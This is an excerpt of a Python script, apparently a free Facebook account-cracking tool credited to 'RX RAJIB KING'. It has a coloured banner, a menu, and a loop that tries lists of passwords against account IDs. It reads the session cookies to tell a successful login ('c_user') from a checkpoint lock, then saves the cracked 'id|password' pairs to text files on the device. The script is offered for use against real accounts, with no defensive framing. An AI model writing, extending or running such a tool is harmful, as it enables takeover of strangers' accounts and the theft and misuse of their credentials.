...
logo=("""\033[1;97m
     ...
     \x1b[1;91m,║╔╗╔╣╚═╝╠╗║║║║║╔═╗║
   \x1b[1;97m , ║║║╚╣╔═╗║╚╝╠╣╠╣╚═╝║
   \x1b[1;97m,  ╚╝╚═╩╝─╚╩══╩══╩═══╝It's Rajib
     VP   V8P  `Y88P'   `Y88P'  Y8888P'
\33[1;37m----------------------------------------------
→   Owner      :  RX RAJIB KING 
→   Facebook   :  RX KING RAJIB
→   Github     :  K1NG 0.2
→   Tool Type  :  \x1b[1;91mFREE
\x1b[1;97m→   Version    :  1.7
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/RK.VAI.420?mibextid=ZbWKwL');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mRAJ1B\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[RAJ1B-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/RAJ1BOK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[RAJ1B-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RAJ1B-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[RAJ1B-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/RAJ1B-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[RAJ1B-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RAJ1B-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[RAJ1B-OK] '+cid+' | '+ps+'\033[1;32m')
				open('RAJ1B-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[RAJ1B-CP] '+cid+' | '+ps+'\33[0;97m')
				open('RAJ1B-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
